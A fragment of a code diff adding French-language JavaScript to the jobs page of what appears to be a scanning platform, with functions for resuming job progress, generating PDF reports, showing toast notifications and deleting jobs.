+        <button class="btn-sm" onclick="genReport(${j.id})"><i data-lucide="file-text"></i> Rapport</button>
+        <button class="btn-sm btn-danger" onclick="deleteJob(${j.id})"><i data-lucide="trash-2"></i> Supprimer</button>
+      </td>
+    </tr>`).join('');
+  if (window.lucide) lucide.createIcons();
+}
+
+async function resumeProgress(jobId, module, target) {
+  currentJobId  = jobId;
+  currentModule = module;
+  currentTarget = target;
+  showProgress(jobId, module, target);
+  await pollJob(jobId);
+}
+
+async function genReport(jobId) {
+  try {
+    await apiFetch('/api/reports/generate', {
+      method: 'POST',
+      body: JSON.stringify({ scan_job_id: jobId, title: `Rapport job #${jobId}`, format: 'pdf' }),
+    });
+    showToast('✅ Rapport en cours de génération — disponible dans <a href="/reports" style="color:#93c5fd">Rapports</a> dans quelques secondes.', 'success');
+  } catch (err) {
+    showToast('❌ Erreur : ' + err.message, 'error');
+  }
+}
+
+function showToast(html, type = 'success') {
+  let container = document.getElementById('toast-container');
+  if (!container) {
+    container = document.createElement('div');
+    container.id = 'toast-container';
+    container.style.cssText = 'position:fixed;bottom:24px;right:24px;display:flex;flex-direction:column;gap:10px;z-index:9999';
+    document.body.appendChild(container);
+  }
+  const toast = document.createElement('div');
+  toast.innerHTML = html;
+  const bg = type === 'error' ? 'rgba(239,68,68,.15)' : 'rgba(34,197,94,.12)';
+  const border = type === 'error' ? 'rgba(239,68,68,.4)' : 'rgba(34,197,94,.35)';
+  toast.style.cssText = `background:${bg};border:1px solid ${border};color:#e2e8f0;padding:14px 20px;border-radius:10px;font-size:.88rem;max-width:360px;backdrop-filter:blur(8px);box-shadow:0 4px 24px rgba(0,0,0,.4);animation:fadeLog .2s ease`;
+  container.appendChild(toast);
+  setTimeout(() => toast.remove(), 5000);
+}
+
+async function deleteJob(jobId) {
+  if (!confirm(`Supprimer le job #${jobId} ? Cette action est irréversible.`)) return;
+  try {
+    await apiFetch(`/api/modules/jobs/${jobId}`, { method: 'DELETE' });
+    if (currentJobId === jobId) resetProgress();
+    await loadJobs();
+  } catch (err) {
+    alert('Erreur : ' + err.message);
+  }
+}
+</script>
+</body>
+</html>
